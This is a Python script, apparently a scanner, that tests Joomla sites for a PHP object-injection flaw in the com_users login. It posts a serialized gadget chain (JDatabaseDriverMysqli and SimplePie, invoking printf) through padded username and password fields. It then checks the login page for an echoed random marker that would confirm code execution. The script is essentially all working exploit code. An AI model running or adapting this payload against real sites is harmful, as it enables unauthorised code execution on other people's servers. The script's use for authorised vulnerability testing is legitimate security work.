import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r1=randomLowercase(10)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r2=randomLowercase(10)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
		try:
			token=re.findall("<input type=\"hidden\" name=\"(\S{32})\"",response.text)[0]
			cookie=response.headers['Set-Cookie']
		except:
			token=''
			cookie=''
	else:
		r0=False
	url=baseurl
	body="username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&"+token+"=1&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22printf%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A43%3A%22http%3A%2F%2FRayTest.6666%2F%3B"+r1+"%25%25"+r2+"%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login"
	headers={
	'Content-Type': 'application/x-www-form-urlencoded',
	'cookie': cookie,
	'Accept-Encoding': '',
	}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	url=baseurl+'index.php?option=com_users&view=login'
	headers={
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Cookie': cookie,
	'Accept-Encoding': '',
	'Referer': 'https://vm.salesaffiliates.net/'
	}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if r1 + "%" + r2 in response.text:
		r11=True
	else:
		r11=False
	if r0 and r11:
		return True
	else:
		return False
